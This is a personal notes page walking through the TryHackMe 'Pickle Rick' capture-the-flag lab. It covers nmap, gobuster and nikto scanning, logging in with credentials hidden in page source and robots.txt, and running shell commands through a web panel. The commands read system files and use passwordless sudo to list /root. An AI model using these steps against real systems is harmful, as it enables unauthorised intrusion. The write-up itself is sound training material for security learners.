<!DOCTYPE html> <html lang="en-US"> <head> <meta charset="UTF-8"> <meta http-equiv="X-UA-Compatible" content="IE=Edge"> <title>Pickle Rick CTF - Penetration Testing Notes</title> <link rel="shortcut icon" href="/pen-test-docs/favicon.ico" type="image/x-icon"> <link rel="stylesheet" href="/pen-test-docs/assets/css/just-the-docs-default.css"> <script type="text/javascript" src="/pen-test-docs/assets/js/vendor/lunr.min.js"></script> <script type="text/javascript" src="/pen-test-docs/assets/js/just-the-docs.js"></script> <meta name="viewport" content="width=device-width, initial-scale=1"> <!-- Begin Jekyll SEO tag v2.8.0 --> <title>Pickle Rick CTF | Penetration Testing Notes</title> <meta name="generator" content="Jekyll v3.9.2" /> <meta property="og:title" content="Pickle Rick CTF" /> <meta property="og:locale" content="en_US" /> <meta name="description" content="Documented notes and learning for penetration testing and related cyber security testing." /> <meta property="og:description" content="Documented notes and learning for penetration testing and related cyber security testing." /> <link rel="canonical" href="https://alipali737.github.io/pen-test-docs/Practice-Labs/tryhackme/Pickle%20Rick%20CTF.html" /> <meta property="og:url" content="https://alipali737.github.io/pen-test-docs/Practice-Labs/tryhackme/Pickle%20Rick%20CTF.html" /> <meta property="og:site_name" content="Penetration Testing Notes" /> <meta property="og:type" content="website" /> <meta name="twitter:card" content="summary" /> <meta property="twitter:title" content="Pickle Rick CTF" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"WebPage","description":"Documented notes and learning for penetration testing and related cyber security testing.","headline":"Pickle Rick CTF","url":"https://alipali737.github.io/pen-test-docs/Practice-Labs/tryhackme/Pickle%20Rick%20CTF.html"}</script> <!-- End Jekyll SEO tag --> </head> <body> <svg xmlns="http://www.w3.org/2000/svg" style="display: none;"> <symbol id="svg-link" viewBox="0 0 24 24"> <title>Link</title> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-link"> <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path> </svg> </symbol> <symbol id="svg-search" viewBox="0 0 24 24"> <title>Search</title> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-search"> <circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line> </svg> </symbol> <symbol id="svg-menu" viewBox="0 0 24 24"> <title>Menu</title> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"> <line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line> </svg> </symbol> <symbol id="svg-arrow-right" viewBox="0 0 24 24"> <title>Expand</title> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right"> <polyline points="9 18 15 12 9 6"></polyline> </svg> </symbol> <symbol id="svg-doc" viewBox="0 0 24 24"> <title>Document</title> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file"> <path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"></path><polyline points="13 2 13 9 20 9"></polyline> </svg> </symbol> </svg> <script type="text/javascript" src="/pen-test-docs/assets/js/toggle_init.js"></script> <div class="side-bar"> <div class="site-header"> <a href="/pen-test-docs/" class="site-title lh-tight"> Penetration Testing Notes </a> <a href="#" id="menu-button" class="site-button"> <svg viewBox="0 0 24 24" class="icon"><use xlink:href="#svg-menu"></use></svg> </a> </div> <nav role="navigation" aria-label="Main" id="site-nav" class="site-nav"> <ul class="nav-list"><li class="nav-list-item"><a href="/pen-test-docs/" class="nav-list-link">Home</a></li> <li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/pen-test-docs/setting-up/setting-up.html" class="nav-list-link">Setting Up</a><ul class="nav-list"><li class="nav-list-item"><a href="/pen-test-docs/setting-up/Logging.html" class="nav-list-link">CLI Logging</a></li> <li class="nav-list-item"><a href="/pen-test-docs/setting-up/Containers.html" class="nav-list-link">Containers</a></li> <li class="nav-list-item"><a href="/pen-test-docs/setting-up/operating-systems.html" class="nav-list-link">Operating Systems</a></li> <li class="nav-list-item"><a href="/pen-test-docs/setting-up/Screenshotting.html" class="nav-list-link">Screenshotting</a></li> <li class="nav-list-item"><a href="/pen-test-docs/setting-up/useful-git-repos.html" class="nav-list-link">Useful Github Repos</a></li> <li class="nav-list-item"><a href="/pen-test-docs/setting-up/virtual-private-servers.html" class="nav-list-link">Virtual Private Servers</a></li> <li class="nav-list-item"><a href="/pen-test-docs/setting-up/Virtualization.html" class="nav-list-link">Virtualization</a></li> </ul> </li> <li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/pen-test-docs/Attacks/Attacks%20Index.html" class="nav-list-link">Attacks</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/pen-test-docs/Attacks/osint/OSINT%20Index.html" class="nav-list-link">Open-source Intelligence</a><ul class="nav-list"><li class="nav-list-item"><a href="/pen-test-docs/Attacks/osint/OSINT%20Framework.html" class="nav-list-link">OSINT Framework</a></li> </ul> </li> <li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/pen-test-docs/Attacks/sql-injection/SQL%20Injection%20Index.html" class="nav-list-link">SQL Injection</a><ul class="nav-list"><li class="nav-list-item"><a href="/pen-test-docs/Attacks/sql-injection/Introduction.html" class="nav-list-link">Introduction</a></li> <li class="nav-list-item"><a href="/pen-test-docs/Attacks/sql-injection/Basic%20SQL%20Syntax.html" class="nav-list-link">Basic SQL Syntax</a></li> <li class="nav-list-item"><a href="/pen-test-docs/Attacks/sql-injection/SQL%20Injection%20Cheatsheet.html" class="nav-list-link">SQL Injection Cheatsheet</a></li> </ul> </li> <li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/pen-test-docs/Attacks/web-application/Web%20Application%20Index.html" class="nav-list-link">Web Application</a><ul class="nav-list"><li class="nav-list-item"><a href="/pen-test-docs/Attacks/web-application/Cross-Site%20Request%20Forgery%20(CSRF).html" class="nav-list-link">Cross-Site Request Forgery (CSRF)</a></li> <li class="nav-list-item"><a href="/pen-test-docs/Attacks/web-application/Cross-Site%20Scripting%20(XSS).html" class="nav-list-link">Cross-Site Scripting (XSS)</a></li> <li class="nav-list-item"><a href="/pen-test-docs/Attacks/web-application/Directory%20Enumeration%20Attack.html" class="nav-list-link">Directory Enumeration Attack</a></li> <li class="nav-list-item"><a href="/pen-test-docs/Attacks/web-application/Server%20Side%20Includes%20(SSI%20Framework)%20(.shtml).html" class="nav-list-link">Server Side Includes (SSI Framework) (.shtml)</a></li> </ul> </li> </ul> </li> <li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/pen-test-docs/Knowledge/Knowledge%20Index.html" class="nav-list-link">Knowledge</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/pen-test-docs/Knowledge/Networks/Networks%20Index.html" class="nav-list-link">Networks</a><ul class="nav-list"><li class="nav-list-item"><a href="/pen-test-docs/Knowledge/Networks/TCP-IP%20Framework.html" class="nav-list-link">TCP/IP Framework</a></li> <li class="nav-list-item"><a href="/pen-test-docs/Knowledge/Networks/Wireless%20Network%20Security.html" class="nav-list-link">Wireless Network Security</a></li> </ul> </li> <li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/pen-test-docs/Knowledge/Testing/Testing%20Index.html" class="nav-list-link">Testing</a><ul class="nav-list"><li class="nav-list-item"><a href="/pen-test-docs/Knowledge/Testing/Application%20Security%20Testing%20Methods.html" class="nav-list-link">Application Security Testing Methods</a></li> </ul> </li> <li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/pen-test-docs/Knowledge/Tools/Tools%20Index.html" class="nav-list-link">Tools</a><ul class="nav-list"><li class="nav-list-item"><a href="/pen-test-docs/Knowledge/Tools/Nmap.html" class="nav-list-link">Nmap</a></li> </ul> </li> </ul> </li> <li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/pen-test-docs/Courses/Courses%20Index.html" class="nav-list-link">Courses</a><ul class="nav-list"><li class="nav-list-item"><a href="/pen-test-docs/Courses/Penetration%20Testing%20Fundamentals%20Bootcamp.html" class="nav-list-link">Penetration Testing Fundamentals Bootcamp</a></li> </ul> </li> <li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/pen-test-docs/Practice-Labs/labs%20index.html" class="nav-list-link">Practice Labs</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/pen-test-docs/Practice-Labs/overthewire/overthewire%20index.html" class="nav-list-link">OverTheWire</a><ul class="nav-list"><li class="nav-list-item"><a href="/pen-test-docs/Practice-Labs/overthewire/Bandit.html" class="nav-list-link">Bandit Lab</a></li> </ul> </li> <li class="nav-list-item"><a href="/pen-test-docs/Practice-Labs/tryhackme/tryhackme%20index.html" class="nav-list-link">TryHackMe</a></li> <li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/pen-test-docs/Practice-Labs/vulnhub/vulnhub%20index.html" class="nav-list-link">VulnHub</a><ul class="nav-list"><li class="nav-list-item"><a href="/pen-test-docs/Practice-Labs/vulnhub/Empire%20-%20Breakout.html" class="nav-list-link">Empire: Breakout CTF</a></li> </ul> </li> </ul> </li> </ul> </nav> <footer class="site-footer"> This site uses <a href="https://github.com/pmarsceill/just-the-docs">Just the Docs</a>, a documentation theme for Jekyll. </footer> </div> <div class="main" id="top"> <div id="main-header" class="main-header"> <div class="search"> <div class="search-input-wrap"> <input type="text" id="search-input" class="search-input" tabindex="0" placeholder="Search Penetration Testing Notes" aria-label="Search Penetration Testing Notes" autocomplete="off"> <label for="search-input" class="search-label"><svg viewBox="0 0 24 24" class="search-icon"><use xlink:href="#svg-search"></use></svg></label> </div> <div id="search-results" class="search-results"></div> </div> <nav aria-label="Auxiliary" class="aux-nav"> <ul class="aux-nav-list"> <li class="aux-nav-list-item"> <a href="//github.com/alipali737/pen-test-docs" class="site-button" > Github Source </a> </li> </ul> </nav> </div> <div id="main-content-wrap" class="main-content-wrap"> <div id="main-content" class="main-content" role="main"> <h1 class="no_toc" id="pickle-rick-ctf"> <a href="#pickle-rick-ctf" class="anchor-heading" aria-labelledby="pickle-rick-ctf"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Pickle Rick CTF </h1> <details open=""> <summary class="text-delta"> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Table of contents
</code></pre></div> </div> </summary> <ul id="markdown-toc"> <li><a href="#recon" id="markdown-toc-recon">Recon</a></li> <li><a href="#scanning" id="markdown-toc-scanning">Scanning</a></li> <li><a href="#exploitation" id="markdown-toc-exploitation">Exploitation</a></li> </ul> </details><hr /> <p>link: https://tryhackme.com/room/picklerick</p> <p>Difficulty: Easy</p> <h2 id="recon"> <a href="#recon" class="anchor-heading" aria-labelledby="recon"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Recon </h2> <p>Have to answer 3 questions:</p> <ul> <li>What is the first ingredient that Rick needs?</li> <li>What is the second ingredient in Rick’s potion?</li> <li>What is the last and final ingredient?</li> </ul> <p>There is a hint hidden in the source code of the main webpage: <code class="language-plaintext highlighter-rouge">Username: R1ckRul3s</code></p> <h2 id="scanning"> <a href="#scanning" class="anchor-heading" aria-labelledby="scanning"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Scanning </h2> <p>What services are running on the target? <code class="language-plaintext highlighter-rouge">nmap -sCV -v -oN tcp &lt;IP&gt;</code></p> <ul> <li>Scan for service versions &amp; default scripts, with verbose, output to file <code class="language-plaintext highlighter-rouge">tcp</code></li> </ul> <div class="table-wrapper"><table> <thead> <tr> <th>Port</th> <th>Service</th> <th>Version</th> <th>Description</th> </tr> </thead> <tbody> <tr> <td>80/tcp</td> <td>Apache httpd (Ubuntu)</td> <td>2.4.18</td> <td>Apache web server supporting GET HEAD POST OPTIONS</td> </tr> <tr> <td>22/tcp</td> <td>ssh</td> <td>OpenSSH 7.2p2</td> <td>SSH</td> </tr> </tbody> </table></div> <p>What can we find out about the ssh running? <code class="language-plaintext highlighter-rouge">nmap -sV --script="ssh*" -oN ssh-scripts-results &lt;IP&gt;</code></p> <ul> <li>Only publickey auth is allowed</li> </ul> <p>Running <code class="language-plaintext highlighter-rouge">gobuster</code> revealed:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/assets (Status: 301)
/robots.txt (Status: 200)
/server-status (Status: 403)
</code></pre></div></div> <ul> <li>The assets directory just shows the images &amp; bootstrap &amp; JQuery js files</li> <li>The robots.txt contains the string: <code class="language-plaintext highlighter-rouge">Wubbalubbadubdub</code></li> </ul> <p>Running <code class="language-plaintext highlighter-rouge">nikto -h &lt;IP&gt;</code> revealed the existence of a <code class="language-plaintext highlighter-rouge">/login.php</code></p> <h2 id="exploitation"> <a href="#exploitation" class="anchor-heading" aria-labelledby="exploitation"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Exploitation </h2> <p>Navigating to <code class="language-plaintext highlighter-rouge">/login.php</code> and entering the credentials we have found:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Username: R1ckRul3s
Password: Wubbalubbadubdub
</code></pre></div></div> <p>We are entered into a command panel. The command panel seems to use bash.</p> <p><code class="language-plaintext highlighter-rouge">ls</code> in the command panel gives:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
</code></pre></div></div> <p>navigating to those files reveals the first ingredient.</p> <p>Realising we can navigate up with <code class="language-plaintext highlighter-rouge">ls</code> we now have access to freely explore the file system.</p> <p>Running <code class="language-plaintext highlighter-rouge">uname -a</code> give us some system details: <code class="language-plaintext highlighter-rouge">Linux ip-10-10-224-157 4.4.0-1072-aws #82-Ubuntu SMP Fri Nov 2 15:00:21 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</code></p> <p>Searching in the <code class="language-plaintext highlighter-rouge">/home/rick</code> dir we find the second ingredient in a file that can be dumped with the <code class="language-plaintext highlighter-rouge">less</code> as <code class="language-plaintext highlighter-rouge">cat</code> is disabled.</p> <p><code class="language-plaintext highlighter-rouge">cd ../../../; ls -al; pwd</code></p> <p><code class="language-plaintext highlighter-rouge">less /etc/*-release</code></p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.5 LTS"
NAME="Ubuntu"
VERSION="16.04.5 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.5 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial
</code></pre></div></div> <p>Useful command to search for all files in home dir: <code class="language-plaintext highlighter-rouge">ls -alhR /home</code></p> <p>doing a <code class="language-plaintext highlighter-rouge">sudo -l</code> its revealed we can run any command without the requirement of a password:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Matching Defaults entries for www-data on ip-10-10-224-157.eu-west-1.compute.internal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-224-157.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL
</code></pre></div></div> <p>running an <code class="language-plaintext highlighter-rouge">sudo ls -alhR /root</code> reveals the final key in <code class="language-plaintext highlighter-rouge">/root/3rd.txt</code></p> <hr> <footer> <p class="text-small text-grey-dk-100 mb-0">This page is being build from gh-pages at revision 356325f0939cd0b4bd7a9ff47d8bccd91b417980</p> </footer> </div> </div> <div class="search-overlay"></div> </div> <script type="text/javascript" src="/pen-test-docs/assets/js/toggle_mode.js"></script> </body> </html>
